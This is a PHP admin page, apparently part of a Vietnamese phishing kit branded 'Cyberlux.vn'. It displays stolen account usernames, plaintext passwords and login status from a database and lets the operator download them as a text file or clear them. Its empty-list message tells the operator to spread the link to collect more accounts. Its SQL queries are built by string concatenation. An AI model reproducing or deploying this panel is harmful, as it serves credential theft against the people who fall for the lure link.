<?php
include('header.php');
$get = $_GET['delete'];
if(isset($get)){
    $connect->query("UPDATE Accounts SET token = '' WHERE token = '".$_SESSION['token']."'");
    echo load('/admin/accounts.php');
}
?>


            <div class=control-sidebar-bg></div>
            <div id=page-wrapper>
                <div class=content>
                    <div class=content-header>
                        <div class=header-icon>
                            <i class=pe-7s-tools></i>
                        </div>
                        <div class=header-title>
                            <h1>Quản Lý Tài Khoản - #<a href="https://<?=$dulieu['domain'];?> " target="_blank"> <?=$dulieu['domain'];?>  </a></h1>
                            <small> Vận hành và phát triển bởi <a href="https://Cyberlux.vn"> Cyberlux.vn </a>.</small>
                            <ol class=breadcrumb>
                                <li><a href=/admin><i class=pe-7s-home></i> Home</a></li>
                                <li class=active>Dashboard</li>
                            </ol>
                        </div>
                    </div>
                    
                    <div class="m-b-15">
                        <button type="button" class="btn btn-success m-r-2 m-b-5" onclick="downloadAccounts()"> Tải File </button>
                        <button type="button" class="btn btn-danger m-r-2 m-b-5" onclick="window.location.href='?delete';"> Xóa Tất Cả </button>
                    </div>
                                    
                    
                   <div class="m-t-20" id="account-list">
                  <pre><?php
                $result = mysqli_query($connect, "SELECT * FROM Accounts WHERE token = '".$_SESSION['token']."'");
                foreach ($result as $row) {
                    $id+=1;
                    echo $row['username'].'|'.$row['password'].'|'.$row['dangnhap'].' <br>';
                } if($id < 1){
                    echo 'Không có tài khoản, hãy rãi link để kiếm tài khoản';
                }
                ?>
                   </pre>
                                    </div>
                                    
                                    
                </div>
            </div>
        </div>

         <script>
            function downloadAccounts() {
                var accounts = "<?php
                $result = mysqli_query($connect, "SELECT * FROM Accounts WHERE token = '".$_SESSION['token']."'");
                foreach ($result as $row) {
                    $id+=1;
                    echo $row['username'].'|'.$row['password'].'|'.$row['dangnhap'].'\\n';
                }
                ?>";
        
                var element = document.createElement('a');
                element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(accounts));
                element.setAttribute('download', '<?=rand(100,900);?>-accounts.txt');
                element.style.display = 'none';
                document.body.appendChild(element);
                element.click();
                document.body.removeChild(element);
            }
        </script>
        


<?php
include('footer.php');
?>